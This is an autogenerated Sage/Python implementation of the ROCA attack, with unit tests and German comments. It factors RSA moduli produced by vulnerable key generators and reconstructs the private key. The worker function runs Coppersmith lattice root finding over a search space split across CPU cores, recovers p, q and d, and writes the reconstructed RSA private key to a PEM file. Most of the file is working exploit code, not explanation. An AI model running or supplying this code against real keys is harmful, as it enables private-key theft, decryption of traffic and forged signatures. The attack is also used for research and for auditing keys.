# coding: utf8

# This file was *autogenerated* from the file roca.sage
from sage.all_cmdline import *   # import sage library

_sage_const_347 = Integer(347); _sage_const_617 = Integer(617); _sage_const_509 = Integer(509); _sage_const_181 = Integer(181); _sage_const_853 = Integer(853); _sage_const_5766152219975951659023630035336134306565384015606066319856068810 = Integer(5766152219975951659023630035336134306565384015606066319856068810); _sage_const_0p5 = RealNumber('0.5'); _sage_const_619 = Integer(619); _sage_const_349 = Integer(349); _sage_const_911 = Integer(911); _sage_const_859 = Integer(859); _sage_const_919 = Integer(919); _sage_const_691 = Integer(691); _sage_const_1039 = Integer(1039); _sage_const_89 = Integer(89); _sage_const_1201 = Integer(1201); _sage_const_2049 = Integer(2049); _sage_const_113 = Integer(113); _sage_const_293 = Integer(293); _sage_const_1171 = Integer(1171); _sage_const_83 = Integer(83); _sage_const_719 = Integer(719); _sage_const_3968 = Integer(3968); _sage_const_593 = Integer(593); _sage_const_761 = Integer(761); _sage_const_599 = Integer(599); _sage_const_331 = Integer(331); _sage_const_337 = Integer(337); _sage_const_1381 = Integer(1381); _sage_const_962947420735983927056946215901134429196419130606213075415963491270 = Integer(962947420735983927056946215901134429196419130606213075415963491270); _sage_const_1024 = Integer(1024); _sage_const_4097 = Integer(4097); _sage_const_1021 = Integer(1021); _sage_const_857 = Integer(857); _sage_const_13 = Integer(13); _sage_const_12 = Integer(12); _sage_const_11 = Integer(11); _sage_const_17 = Integer(17); _sage_const_0p863393112566 = RealNumber('0.863393112566'); _sage_const_829 = Integer(829); _sage_const_907 = Integer(907); _sage_const_827 = Integer(827); _sage_const_1307 = Integer(1307); _sage_const_19 = Integer(19); _sage_const_503 = Integer(503); _sage_const_823 = Integer(823); _sage_const_1303 = Integer(1303); _sage_const_821 = Integer(821); _sage_const_1301 = Integer(1301); _sage_const_109 = Integer(109); _sage_const_100 = Integer(100); _sage_const_101 = Integer(101); _sage_const_103 = Integer(103); _sage_const_97 = Integer(97); _sage_const_1237 = Integer(1237); _sage_const_107 = Integer(107); _sage_const_1984 = Integer(1984); _sage_const_757 = Integer(757); _sage_const_587 = Integer(587); _sage_const_229 = Integer(229); _sage_const_225 = Integer(225); _sage_const_457 = Integer(457); _sage_const_227 = Integer(227); _sage_const_997 = Integer(997); _sage_const_223 = Integer(223); _sage_const_1153 = Integer(1153); _sage_const_359 = Integer(359); _sage_const_1151 = Integer(1151); _sage_const_1231 = Integer(1231); _sage_const_733 = Integer(733); _sage_const_523 = Integer(523); _sage_const_521 = Integer(521); _sage_const_1423 = Integer(1423); _sage_const_329 = Integer(329); _sage_const_937 = Integer(937); _sage_const_1279 = Integer(1279); _sage_const_1427 = Integer(1427); _sage_const_443 = Integer(443); _sage_const_241 = Integer(241); _sage_const_1013 = Integer(1013); _sage_const_1033 = Integer(1033); _sage_const_929 = Integer(929); _sage_const_839 = Integer(839); _sage_const_29567546832423600 = Integer(29567546832423600); _sage_const_1019 = Integer(1019); _sage_const_2454106387091158800 = Integer(2454106387091158800); _sage_const_67 = Integer(67); _sage_const_137 = Integer(137); _sage_const_131 = Integer(131); _sage_const_1289 = Integer(1289); _sage_const_61 = Integer(61); _sage_const_510510 = Integer(510510); _sage_const_139 = Integer(139); _sage_const_138 = Integer(138); _sage_const_1223 = Integer(1223); _sage_const_2048 = Integer(2048); _sage_const_743 = Integer(743); _sage_const_1321 = Integer(1321); _sage_const_239 = Integer(239); _sage_const_233 = Integer(233); _sage_const_421 = Integer(421); _sage_const_983 = Integer(983); _sage_const_353 = Integer(353); _sage_const_881 = Integer(881); _sage_const_883 = Integer(883); _sage_const_727 = Integer(727); _sage_const_557 = Integer(557); _sage_const_1163 = Integer(1163); _sage_const_887 = Integer(887); _sage_const_1367 = Integer(1367); _sage_const_1953 = Integer(1953); _sage_const_487 = Integer(487); _sage_const_257 = Integer(257); _sage_const_251 = Integer(251); _sage_const_809 = Integer(809); _sage_const_1249 = Integer(1249); _sage_const_1922760350154212639070 = Integer(1922760350154212639070); _sage_const_992 = Integer(992); _sage_const_1009 = Integer(1009); _sage_const_991 = Integer(991); _sage_const_751 = Integer(751); _sage_const_653 = Integer(653); _sage_const_126 = Integer(126); _sage_const_127 = Integer(127); _sage_const_73 = Integer(73); _sage_const_1123 = Integer(1123); _sage_const_1319 = Integer(1319); _sage_const_1093 = Integer(1093); _sage_const_1091 = Integer(1091); _sage_const_79 = Integer(79); _sage_const_1097 = Integer(1097); _sage_const_149 = Integer(149); _sage_const_439 = Integer(439); _sage_const_1049 = Integer(1049); _sage_const_769 = Integer(769); _sage_const_431 = Integer(431); _sage_const_476298360135403827647694455135540816872519553549434458452846518961225116628296331399988870173121220163740886622806757743417410016369560917503559802728927524348613100806519956368338676760941104305001080979323085946578890537415191372500790547035255053448294510903517632483050316251051922824918501207944180748924570584954958405734358577378608781593419480418233727143405369379364772277980023160119485272194113567058285570751863313298410604353830525661335472172800368148779192235876130866530676559044032444122691571891815741607453068540512153426085458681458456535671760914797231872574004919368930 = Integer(476298360135403827647694455135540816872519553549434458452846518961225116628296331399988870173121220163740886622806757743417410016369560917503559802728927524348613100806519956368338676760941104305001080979323085946578890537415191372500790547035255053448294510903517632483050316251051922824918501207944180748924570584954958405734358577378608781593419480418233727143405369379364772277980023160119485272194113567058285570751863313298410604353830525661335472172800368148779192235876130866530676559044032444122691571891815741607453068540512153426085458681458456535671760914797231872574004919368930); _sage_const_433 = Integer(433); _sage_const_631 = Integer(631); _sage_const_269 = Integer(269); _sage_const_541 = Integer(541); _sage_const_499 = Integer(499); _sage_const_547 = Integer(547); _sage_const_613 = Integer(613); _sage_const_263 = Integer(263); _sage_const_491 = Integer(491); _sage_const_200560490130 = Integer(200560490130); _sage_const_811 = Integer(811); _sage_const_1409 = Integer(1409); _sage_const_1277 = Integer(1277); _sage_const_953 = Integer(953); _sage_const_797 = Integer(797); _sage_const_41 = Integer(41); _sage_const_397 = Integer(397); _sage_const_43 = Integer(43); _sage_const_1361 = Integer(1361); _sage_const_47 = Integer(47); _sage_const_1087 = Integer(1087); _sage_const_1051 = Integer(1051); _sage_const_157 = Integer(157); _sage_const_401 = Integer(401); _sage_const_151 = Integer(151); _sage_const_1422 = Integer(1422); _sage_const_643 = Integer(643); _sage_const_317 = Integer(317); _sage_const_1327 = Integer(1327); _sage_const_311 = Integer(311); _sage_const_313 = Integer(313); _sage_const_467 = Integer(467); _sage_const_277 = Integer(277); _sage_const_1061 = Integer(1061); _sage_const_1297 = Integer(1297); _sage_const_463 = Integer(463); _sage_const_1109 = Integer(1109); _sage_const_379 = Integer(379); _sage_const_271 = Integer(271); _sage_const_1069 = Integer(1069); _sage_const_373 = Integer(373); _sage_const_1103 = Integer(1103); _sage_const_863 = Integer(863); _sage_const_787 = Integer(787); _sage_const_607 = Integer(607); _sage_const_59 = Integer(59); _sage_const_71 = Integer(71); _sage_const_947 = Integer(947); _sage_const_53 = Integer(53); _sage_const_641 = Integer(641); _sage_const_383 = Integer(383); _sage_const_1373 = Integer(1373); _sage_const_1259 = Integer(1259); _sage_const_409 = Integer(409); _sage_const_389 = Integer(389); _sage_const_659 = Integer(659); _sage_const_647 = Integer(647); _sage_const_419 = Integer(419); _sage_const_307 = Integer(307); _sage_const_739 = Integer(739); _sage_const_3 = Integer(3); _sage_const_2 = Integer(2); _sage_const_1 = Integer(1); _sage_const_0 = Integer(0); _sage_const_7 = Integer(7); _sage_const_6 = Integer(6); _sage_const_5 = Integer(5); _sage_const_4 = Integer(4); _sage_const_1117 = Integer(1117); _sage_const_367 = Integer(367); _sage_const_1031 = Integer(1031); _sage_const_479 = Integer(479); _sage_const_29 = Integer(29); _sage_const_877 = Integer(877); _sage_const_971 = Integer(971); _sage_const_23 = Integer(23); _sage_const_3937 = Integer(3937); _sage_const_977 = Integer(977); _sage_const_1063 = Integer(1063); _sage_const_1187 = Integer(1187); _sage_const_1291 = Integer(1291); _sage_const_461 = Integer(461); _sage_const_26 = Integer(26); _sage_const_1399 = Integer(1399); _sage_const_1p5 = RealNumber('1.5'); _sage_const_173 = Integer(173); _sage_const_661 = Integer(661); _sage_const_709 = Integer(709); _sage_const_179 = Integer(179); _sage_const_577 = Integer(577); _sage_const_25 = Integer(25); _sage_const_571 = Integer(571); _sage_const_701 = Integer(701); _sage_const_193 = Integer(193); _sage_const_211 = Integer(211); _sage_const_191 = Integer(191); _sage_const_197 = Integer(197); _sage_const_601 = Integer(601); _sage_const_449 = Integer(449); _sage_const_65537 = Integer(65537); _sage_const_199 = Integer(199); _sage_const_1283 = Integer(1283); _sage_const_512 = Integer(512); _sage_const_510 = Integer(510); _sage_const_39 = Integer(39); _sage_const_967 = Integer(967); _sage_const_941 = Integer(941); _sage_const_961 = Integer(961); _sage_const_31 = Integer(31); _sage_const_1229 = Integer(1229); _sage_const_8 = Integer(8); _sage_const_1129 = Integer(1129); _sage_const_683 = Integer(683); _sage_const_37 = Integer(37); _sage_const_1181 = Integer(1181); _sage_const_1217 = Integer(1217); _sage_const_1193 = Integer(1193); _sage_const_1213 = Integer(1213); _sage_const_283 = Integer(283); _sage_const_167 = Integer(167); _sage_const_281 = Integer(281); _sage_const_163 = Integer(163); _sage_const_673 = Integer(673); _sage_const_569 = Integer(569); _sage_const_677 = Integer(677); _sage_const_773 = Integer(773); _sage_const_563 = Integer(563)
import argparse
from Crypto.PublicKey import RSA
import time
import multiprocessing
from fractions import gcd as gcd
import math
from sage.all_cmdline import *
import unittest
import progressbar
from coppersmith import coppersmith_howgrave_univariate

class TestImplementation(unittest.TestCase):

    def test_ord(self):
        self.assertEqual(ord(_sage_const_3 ), _sage_const_2 )
        self.assertEqual(ord(_sage_const_1423 ), _sage_const_1422 )
        self.assertEqual(ord(_sage_const_329 ), _sage_const_138 )
        self.assertEqual(ord(_sage_const_331 ), _sage_const_2 )

    def test_order(self):
        self.assertEqual(order([_sage_const_5 , _sage_const_7 , _sage_const_11 ]), lcm([ord(_sage_const_5 ), ord(_sage_const_7 ), ord(_sage_const_11 )]))
        self.assertEqual(order([_sage_const_3 , _sage_const_5 , _sage_const_7 , _sage_const_11 ]), lcm([ord(_sage_const_3 ), ord(_sage_const_5 ), ord(_sage_const_7 ), ord(_sage_const_11 )]))
        self.assertEqual(order([_sage_const_73 , _sage_const_97 , _sage_const_101 ]), lcm([ord(_sage_const_73 ), ord(_sage_const_97 ), ord(_sage_const_101 )]))
        self.assertEqual(order([_sage_const_151 , _sage_const_97 , _sage_const_163 ]), lcm([ord(_sage_const_163 ), ord(_sage_const_97 ), ord(_sage_const_151 )]))

    def test_CalcM(self):
        self.assertEqual(calcM(get_primes(_sage_const_7 )), _sage_const_510510 )
        self.assertEqual(calcM(get_primes(_sage_const_17 )), _sage_const_1922760350154212639070 )
        self.assertEqual(calcM(get_primes(_sage_const_11 )), _sage_const_200560490130 )
        self.assertEqual(calcM(get_primes(_sage_const_39 )), _sage_const_962947420735983927056946215901134429196419130606213075415963491270 )
        self.assertEqual(calcM(get_primes(_sage_const_225 )),
                         _sage_const_476298360135403827647694455135540816872519553549434458452846518961225116628296331399988870173121220163740886622806757743417410016369560917503559802728927524348613100806519956368338676760941104305001080979323085946578890537415191372500790547035255053448294510903517632483050316251051922824918501207944180748924570584954958405734358577378608781593419480418233727143405369379364772277980023160119485272194113567058285570751863313298410604353830525661335472172800368148779192235876130866530676559044032444122691571891815741607453068540512153426085458681458456535671760914797231872574004919368930 )

    def test_get_Param(self):
        param512 = get_param(_sage_const_512 )
        param1024 = get_param(_sage_const_1024 )
        param2048 = get_param(_sage_const_2048 )
        self.assertEqual(param512['anz'], _sage_const_39 )
        self.assertEqual(param1024['anz'], _sage_const_71 )
        self.assertEqual(param2048['anz'], _sage_const_126 )

        self.assertEqual(param512['m'], _sage_const_5 )
        self.assertEqual(param1024['m'], _sage_const_4 )
        self.assertEqual(param2048['m'], _sage_const_6 )

        self.assertEqual(param512['t'], _sage_const_6 )
        self.assertEqual(param1024['t'], _sage_const_5 )
        self.assertEqual(param2048['t'], _sage_const_7 )

    def test_get_primes(self):
        num_primes = [_sage_const_39 , _sage_const_71 , _sage_const_126 , _sage_const_225 ]
        for n in num_primes:
            if n == _sage_const_39 :
                reference = [_sage_const_2 , _sage_const_3 , _sage_const_5 , _sage_const_7 , _sage_const_11 , _sage_const_13 , _sage_const_17 , _sage_const_19 , _sage_const_23 , _sage_const_29 , _sage_const_31 , _sage_const_37 , _sage_const_41 , _sage_const_43 , _sage_const_47 ,
                             _sage_const_53 , _sage_const_59 , _sage_const_61 , _sage_const_67 , _sage_const_71 , _sage_const_73 , _sage_const_79 , _sage_const_83 , _sage_const_89 , _sage_const_97 , _sage_const_101 , _sage_const_103 , _sage_const_107 , _sage_const_109 , _sage_const_113 , _sage_const_127 ,
                             _sage_const_131 , _sage_const_137 , _sage_const_139 , _sage_const_149 , _sage_const_151 , _sage_const_157 , _sage_const_163 , _sage_const_167 ]
            elif n == _sage_const_71 :
                reference = [_sage_const_2 , _sage_const_3 , _sage_const_5 , _sage_const_7 , _sage_const_11 , _sage_const_13 , _sage_const_17 , _sage_const_19 , _sage_const_23 , _sage_const_29 , _sage_const_31 , _sage_const_37 , _sage_const_41 , _sage_const_43 , _sage_const_47 ,
                             _sage_const_53 , _sage_const_59 , _sage_const_61 , _sage_const_67 , _sage_const_71 , _sage_const_73 , _sage_const_79 , _sage_const_83 , _sage_const_89 , _sage_const_97 , _sage_const_101 , _sage_const_103 , _sage_const_107 , _sage_const_109 , _sage_const_113 , _sage_const_127 ,
                             _sage_const_131 , _sage_const_137 , _sage_const_139 , _sage_const_149 , _sage_const_151 , _sage_const_157 , _sage_const_163 , _sage_const_167 , _sage_const_173 , _sage_const_179 , _sage_const_181 , _sage_const_191 , _sage_const_193 , _sage_const_197 ,
                             _sage_const_199 , _sage_const_211 , _sage_const_223 , _sage_const_227 , _sage_const_229 , _sage_const_233 , _sage_const_239 , _sage_const_241 , _sage_const_251 , _sage_const_257 , _sage_const_263 , _sage_const_269 , _sage_const_271 , _sage_const_277 ,
                             _sage_const_281 , _sage_const_283 , _sage_const_293 , _sage_const_307 , _sage_const_311 , _sage_const_313 , _sage_const_317 , _sage_const_331 , _sage_const_337 , _sage_const_347 , _sage_const_349 , _sage_const_353 ]
            elif n == _sage_const_126 :
                reference = [_sage_const_2 , _sage_const_3 , _sage_const_5 , _sage_const_7 , _sage_const_11 , _sage_const_13 , _sage_const_17 , _sage_const_19 , _sage_const_23 , _sage_const_29 , _sage_const_31 , _sage_const_37 , _sage_const_41 , _sage_const_43 , _sage_const_47 ,
                             _sage_const_53 , _sage_const_59 , _sage_const_61 , _sage_const_67 , _sage_const_71 , _sage_const_73 , _sage_const_79 , _sage_const_83 , _sage_const_89 , _sage_const_97 , _sage_const_101 , _sage_const_103 , _sage_const_107 , _sage_const_109 , _sage_const_113 , _sage_const_127 ,
                             _sage_const_131 , _sage_const_137 , _sage_const_139 , _sage_const_149 , _sage_const_151 , _sage_const_157 , _sage_const_163 , _sage_const_167 , _sage_const_173 , _sage_const_179 , _sage_const_181 , _sage_const_191 , _sage_const_193 , _sage_const_197 ,
                             _sage_const_199 , _sage_const_211 , _sage_const_223 , _sage_const_227 , _sage_const_229 , _sage_const_233 , _sage_const_239 , _sage_const_241 , _sage_const_251 , _sage_const_257 , _sage_const_263 , _sage_const_269 , _sage_const_271 , _sage_const_277 ,
                             _sage_const_281 , _sage_const_283 , _sage_const_293 , _sage_const_307 , _sage_const_311 , _sage_const_313 , _sage_const_317 , _sage_const_331 , _sage_const_337 , _sage_const_347 , _sage_const_349 , _sage_const_353 , _sage_const_359 , _sage_const_367 ,
                             _sage_const_373 , _sage_const_379 , _sage_const_383 , _sage_const_389 , _sage_const_397 , _sage_const_401 , _sage_const_409 , _sage_const_419 , _sage_const_421 , _sage_const_431 , _sage_const_433 , _sage_const_439 , _sage_const_443 , _sage_const_449 ,
                             _sage_const_457 , _sage_const_461 , _sage_const_463 , _sage_const_467 , _sage_const_479 , _sage_const_487 , _sage_const_491 , _sage_const_499 , _sage_const_503 , _sage_const_509 , _sage_const_521 , _sage_const_523 , _sage_const_541 , _sage_const_547 ,
                             _sage_const_557 , _sage_const_563 , _sage_const_569 , _sage_const_571 , _sage_const_577 , _sage_const_587 , _sage_const_593 , _sage_const_599 , _sage_const_601 , _sage_const_607 , _sage_const_613 , _sage_const_617 , _sage_const_619 , _sage_const_631 ,
                             _sage_const_641 , _sage_const_643 , _sage_const_647 , _sage_const_653 , _sage_const_659 , _sage_const_661 , _sage_const_673 , _sage_const_677 , _sage_const_683 , _sage_const_691 , _sage_const_701 ]
            elif n == _sage_const_225 :
                reference = [_sage_const_2 , _sage_const_3 , _sage_const_5 , _sage_const_7 , _sage_const_11 , _sage_const_13 , _sage_const_17 , _sage_const_19 , _sage_const_23 , _sage_const_29 , _sage_const_31 , _sage_const_37 , _sage_const_41 , _sage_const_43 , _sage_const_47 ,
                             _sage_const_53 , _sage_const_59 , _sage_const_61 , _sage_const_67 , _sage_const_71 , _sage_const_73 , _sage_const_79 , _sage_const_83 , _sage_const_89 , _sage_const_97 , _sage_const_101 , _sage_const_103 , _sage_const_107 , _sage_const_109 , _sage_const_113 , _sage_const_127 ,
                             _sage_const_131 , _sage_const_137 , _sage_const_139 , _sage_const_149 , _sage_const_151 , _sage_const_157 , _sage_const_163 , _sage_const_167 , _sage_const_173 , _sage_const_179 , _sage_const_181 , _sage_const_191 , _sage_const_193 , _sage_const_197 ,
                             _sage_const_199 , _sage_const_211 , _sage_const_223 , _sage_const_227 , _sage_const_229 , _sage_const_233 , _sage_const_239 , _sage_const_241 , _sage_const_251 , _sage_const_257 , _sage_const_263 , _sage_const_269 , _sage_const_271 , _sage_const_277 ,
                             _sage_const_281 , _sage_const_283 , _sage_const_293 , _sage_const_307 , _sage_const_311 , _sage_const_313 , _sage_const_317 , _sage_const_331 , _sage_const_337 , _sage_const_347 , _sage_const_349 , _sage_const_353 , _sage_const_359 , _sage_const_367 ,
                             _sage_const_373 , _sage_const_379 , _sage_const_383 , _sage_const_389 , _sage_const_397 , _sage_const_401 , _sage_const_409 , _sage_const_419 , _sage_const_421 , _sage_const_431 , _sage_const_433 , _sage_const_439 , _sage_const_443 , _sage_const_449 ,
                             _sage_const_457 , _sage_const_461 , _sage_const_463 , _sage_const_467 , _sage_const_479 , _sage_const_487 , _sage_const_491 , _sage_const_499 , _sage_const_503 , _sage_const_509 , _sage_const_521 , _sage_const_523 , _sage_const_541 , _sage_const_547 ,
                             _sage_const_557 , _sage_const_563 , _sage_const_569 , _sage_const_571 , _sage_const_577 , _sage_const_587 , _sage_const_593 , _sage_const_599 , _sage_const_601 , _sage_const_607 , _sage_const_613 , _sage_const_617 , _sage_const_619 , _sage_const_631 ,
                             _sage_const_641 , _sage_const_643 , _sage_const_647 , _sage_const_653 , _sage_const_659 , _sage_const_661 , _sage_const_673 , _sage_const_677 , _sage_const_683 , _sage_const_691 , _sage_const_701 , _sage_const_709 , _sage_const_719 , _sage_const_727 ,
                             _sage_const_733 , _sage_const_739 , _sage_const_743 , _sage_const_751 , _sage_const_757 , _sage_const_761 , _sage_const_769 , _sage_const_773 , _sage_const_787 , _sage_const_797 , _sage_const_809 , _sage_const_811 , _sage_const_821 , _sage_const_823 ,
                             _sage_const_827 , _sage_const_829 , _sage_const_839 , _sage_const_853 , _sage_const_857 , _sage_const_859 , _sage_const_863 , _sage_const_877 , _sage_const_881 , _sage_const_883 , _sage_const_887 , _sage_const_907 , _sage_const_911 , _sage_const_919 ,
                             _sage_const_929 , _sage_const_937 , _sage_const_941 , _sage_const_947 , _sage_const_953 , _sage_const_967 , _sage_const_971 , _sage_const_977 , _sage_const_983 , _sage_const_991 , _sage_const_997 , _sage_const_1009 , _sage_const_1013 ,
                             _sage_const_1019 , _sage_const_1021 , _sage_const_1031 , _sage_const_1033 , _sage_const_1039 , _sage_const_1049 , _sage_const_1051 , _sage_const_1061 , _sage_const_1063 , _sage_const_1069 , _sage_const_1087 ,
                             _sage_const_1091 , _sage_const_1093 , _sage_const_1097 , _sage_const_1103 , _sage_const_1109 , _sage_const_1117 , _sage_const_1123 , _sage_const_1129 , _sage_const_1151 , _sage_const_1153 , _sage_const_1163 ,
                             _sage_const_1171 , _sage_const_1181 , _sage_const_1187 , _sage_const_1193 , _sage_const_1201 , _sage_const_1213 , _sage_const_1217 , _sage_const_1223 , _sage_const_1229 , _sage_const_1231 , _sage_const_1237 ,
                             _sage_const_1249 , _sage_const_1259 , _sage_const_1277 , _sage_const_1279 , _sage_const_1283 , _sage_const_1289 , _sage_const_1291 , _sage_const_1297 , _sage_const_1301 , _sage_const_1303 , _sage_const_1307 ,
                             _sage_const_1319 , _sage_const_1321 , _sage_const_1327 , _sage_const_1361 , _sage_const_1367 , _sage_const_1373 , _sage_const_1381 , _sage_const_1399 , _sage_const_1409 , _sage_const_1423 , _sage_const_1427 ]
        erg = []
        for p in get_primes(n):
            erg.append(p)
        self.assertEqual(erg, reference)

    def test_prime_factors(self):
        num = _sage_const_126 
        reference = [_sage_const_2 , _sage_const_3 , _sage_const_3 , _sage_const_7 ]
        self.assertEqual(prime_factors(num), reference)

    def test_a2(self):
        M = _sage_const_962947420735983927056946215901134429196419130606213075415963491270 
        ord_new = _sage_const_2454106387091158800  / _sage_const_83 
        n = [_sage_const_2 , _sage_const_3 , _sage_const_5 , _sage_const_7 , _sage_const_11 , _sage_const_13 , _sage_const_17 , _sage_const_19 , _sage_const_23 , _sage_const_29 , _sage_const_31 , _sage_const_37 , _sage_const_41 , _sage_const_43 , _sage_const_47 ,
             _sage_const_53 , _sage_const_59 , _sage_const_61 , _sage_const_67 , _sage_const_71 , _sage_const_73 , _sage_const_79 , _sage_const_83 , _sage_const_89 , _sage_const_97 , _sage_const_101 , _sage_const_103 , _sage_const_107 , _sage_const_109 , _sage_const_113 , _sage_const_127 ,
             _sage_const_131 , _sage_const_137 , _sage_const_139 , _sage_const_149 , _sage_const_151 , _sage_const_157 , _sage_const_163 , _sage_const_167 ]

        M_new = _sage_const_962947420735983927056946215901134429196419130606213075415963491270  / _sage_const_167 
        pf_M = [_sage_const_2 , _sage_const_3 , _sage_const_5 , _sage_const_7 , _sage_const_11 , _sage_const_13 , _sage_const_17 , _sage_const_19 , _sage_const_23 , _sage_const_29 , _sage_const_31 , _sage_const_37 , _sage_const_41 , _sage_const_43 , _sage_const_47 , _sage_const_53 , _sage_const_59 ,
                _sage_const_61 , _sage_const_67 , _sage_const_71 , _sage_const_73 , _sage_const_79 , _sage_const_83 , _sage_const_89 , _sage_const_97 , _sage_const_101 , _sage_const_103 , _sage_const_107 , _sage_const_109 , _sage_const_113 , _sage_const_127 , _sage_const_131 , _sage_const_137 ,
                _sage_const_139 , _sage_const_149 , _sage_const_151 , _sage_const_157 , _sage_const_163 ]

        self.assertEqual(a2(M, n, ord_new), (M_new, pf_M))

    def test_choose_divisor(self):
        reference = _sage_const_0p863393112566 

        self.assertEqual(round(choose_divisor(_sage_const_5766152219975951659023630035336134306565384015606066319856068810 ,
                                              _sage_const_962947420735983927056946215901134429196419130606213075415963491270 ,
                                              _sage_const_29567546832423600 , _sage_const_2454106387091158800 ), _sage_const_12 ), reference)


TEST = False
DEBUG = False

start_time = time.time()
"""
Parameter:
    N = p * q
    M = Produkt der ersten n Primzahlen
    m und t = Optimierungs Parameter fuer Coppersmith
"""

#Get end of Search space für thread c
def get_end(c, ord, id):
    start = int(c) / int(_sage_const_2 )
    end = (c + ord) / _sage_const_2 
    count = end - start
    cpus = multiprocessing.cpu_count()
    div = floor(count / cpus)
    return int(start + div * (id + _sage_const_1 ) - _sage_const_1 )

#get start of search space für thread c
def get_start(c, ord, id):
    start = int(c) / int(_sage_const_2 )
    end = (c + ord) / _sage_const_2 
    count = end - start
    cpus = multiprocessing.cpu_count()
    div = floor(count / cpus)
    return int(start + div * id)


def worker(args):
    id = args['cpu']
    N = Integer(args['n'])
    M_strich = args['M_strich']
    t = args['t']
    c = args['c']
    ord = args['ord_new']
    m = args['m']
    privkey = args['privkey']
    event = args['event']

    beta = _sage_const_0p5 
    X = ceil(_sage_const_2  * pow(N, beta) / M_strich)

    start = get_start(c, ord, id)
    end = get_end(c, ord, id)
    ZmodN = Zmod(N)

    if id == _sage_const_1 :
        max_tries = end - start
        bar = progressbar.ProgressBar(max_value=max_tries)
        bar.update(_sage_const_0 )

    counter = _sage_const_0 

    for a_strich in xrange(start, end):
        R = PolynomialRing(ZmodN, names=('x',)); (x,) = R._first_ngens(1)

        invers = inverse_mod(int(M_strich), N)
        pol = x + (invers * int(Integer(_sage_const_65537 ).powermod(a_strich, M_strich)))

        roots = coppersmith_howgrave_univariate(pol, N, beta, m, t, X)

        for root in roots:
            p = root * M_strich + int(Integer(_sage_const_65537 ).powermod(a_strich, M_strich))
            if N % p == _sage_const_0 :
                event.set()
                print("--- Success!!!! ---")
                print("--- %s seconds ---" % (time.time() - start_time))
                p = long(p)
                print("p: %d " % p)
                q = long(N / p)
                print("q: %d " % q)
                n = (long(p * q))
                print("n: %d " % n)
                e = long(_sage_const_65537 )
                print("e: %d " % e)
                d = long(inverse_mod(e, ((q - _sage_const_1 ) * (p - _sage_const_1 ))))
                print("d: %d " % d)
                private_key = RSA.construct((n, e, d, p, q))
                save_key(privkey, private_key)

        counter += _sage_const_1 
        if counter % _sage_const_100  == _sage_const_0  and id == _sage_const_1 :
            counter = _sage_const_0 
            bar.update(a_strich - start + _sage_const_1 )
        if event.is_set():
            break
    return


def save_key(filename, pk):
    with open(filename, 'wb') as pem_out:
        pem_out.write(pk.exportKey())


#Ordnung von 65537 zur basis i
def ord(i):
    generator = _sage_const_65537 

    for j in range(_sage_const_1 , i):
        # print(str(j))
        if generator ** j % i == _sage_const_1 :
            return j
        else:
            continue

#Kleinstes gemeinsames vielfaches von allen ord() aus der liste pi
def order(pi):
    ord_pi = []

    for i in pi:
        ord_pi.append(ord(i))

    ord_m = lcm(ord_pi)
    if DEBUG:
        print ord_m
    return ord_m


def get_primes(x):
    P = Primes()
    erg = []
    for i in range(x):
        erg.append(P.unrank(i))
    return erg


def calcM(n):
    M = _sage_const_1 
    for i in n:
        M = M * i
    return M


def get_param(key_size):
    if key_size < _sage_const_510 :
        return _sage_const_0 
    elif key_size < _sage_const_961 :
        return {'anz': _sage_const_39 , 'm': _sage_const_5 , 't': _sage_const_6 }
    elif key_size < _sage_const_992 :
        return _sage_const_0 
    elif key_size < _sage_const_1953 :
        return {'anz': _sage_const_71 , 'm': _sage_const_4 , 't': _sage_const_5 }
    elif key_size < _sage_const_1984 :
        return _sage_const_0 
    elif key_size < _sage_const_2049 :
        return {'anz': _sage_const_126 , 'm': _sage_const_6 , 't': _sage_const_7 }

    elif key_size < _sage_const_3937 :
        return {'anz': _sage_const_126 , 'm': _sage_const_25 , 't': _sage_const_26 }
    elif key_size < _sage_const_3968 :
        return _sage_const_0 
    elif key_size < _sage_const_4097 :
        return {'anz': _sage_const_225 , 'm': _sage_const_7 , 't': _sage_const_8 }
    return _sage_const_0 


def prime_factors(n):
    primfac = []
    d = _sage_const_2 
    while d * d <= n:
        while (n % d) == _sage_const_0 :
            primfac.append(d)  # supposing you want multiple factors repeated
            n //= d
        d += _sage_const_1 
    if n > _sage_const_1 :
        primfac.append(n)

    return primfac


# vgl Algorithmus 2 im Paper
# M, Primfaktoren von M und Kandidat für Ordnung
def a2(M, pfo, ord_strich):
    # M_strich = ZZ(M)
    M_strich = M

    for p in reversed(pfo):
        # ord_pi teilt nicht ord_strich
        # print("Ord_strich in A2: %d" % ord_strich)
        # print("Ordnung von %d in A2: %d" % (p, ord(p)))
        if ord_strich % ord(p) != _sage_const_0 :
            M_strich /= p
            pfo.remove(p)

    return M_strich, pfo


def choose_divisor(M, Mold, ord, ordold):
    try:
        erg = (math.log(ordold, _sage_const_2 ) - math.log(ord, _sage_const_2 )) / (math.log(Mold, _sage_const_2 ) - math.log(M, _sage_const_2 ))
    except ZeroDivisionError:
        erg = _sage_const_0 
    return erg


def greedy_heuristic(n, M, limes):
    # Init values
    ord_M = order(n)
    pfo = prime_factors(ord_M)  # Ordnung der einzelnen Primfaktoren der Ordnung M
    pf_M = n  # Primfaktoren von M
    M_old = M
    ord_new = ord_M

    # Fügt die Potenzen der Primfaktoren hinzu zB 2⁴, 3⁴, etc.
    for j in pfo:
        count = _sage_const_0 
        for k in range(_sage_const_0 , len(pfo)):
            if pfo[k] == j:
                count += _sage_const_1 
                pfo[k] = pow(j, count)

    runde = _sage_const_1 

    while True:

        div_dict = {}

        # Iteriert durch alle Ordnungen der Primfaktoren von der Ordnung von M
        # Berechnet alle möglichen M_Strichs für die Auswahl des besten Kandidaten für M_Strich
        for p in reversed(pfo):
            pf_M_tmp = list(pf_M)
            M_new, pf_M_tmp = a2(M_old, pf_M_tmp, int(ord_new / p))  # Kandidat für M_strich
            div = choose_divisor(M_new, M_old, ord_new / p, ord_new)

            div_dict[p] = (div, M_new, pf_M_tmp)

        best_candidate = max(div_dict, key=div_dict.get)

        ord_new /= best_candidate

        if not log(div_dict[best_candidate][_sage_const_1 ], _sage_const_2 ) > limes:
            if DEBUG:
                print(M_old)
                print(div_dict[best_candidate][_sage_const_1 ])
            break

        M_old = div_dict[best_candidate][_sage_const_1 ]
        pfo.remove(best_candidate)
        pf_M = div_dict[best_candidate][_sage_const_2 ]

        if DEBUG:
            print("best candidate:" + str(best_candidate))
            print("M Strich nach Runde %d: %d" % (runde, M_old))
            print("ORD NEW: " + str(ord_new))
            print("PRIME Factors: " + str(pfo))
            print("Log von N zur basis 2: %d" % limes)
            print("Log M_Strich zur basis 2: %d" % (log(M_old, _sage_const_2 )))
            print("Bitlength of M_strich %d nach Runde %d" % (int(M_old).bit_length(), runde))
